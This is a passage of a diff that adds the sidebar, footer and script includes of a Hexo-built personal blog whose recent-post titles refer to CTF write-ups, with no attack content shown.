class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/10/01/4%E6%9C%88%E5%81%9A%E9%A2%98/">4月做题</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/13/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 ccreater<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
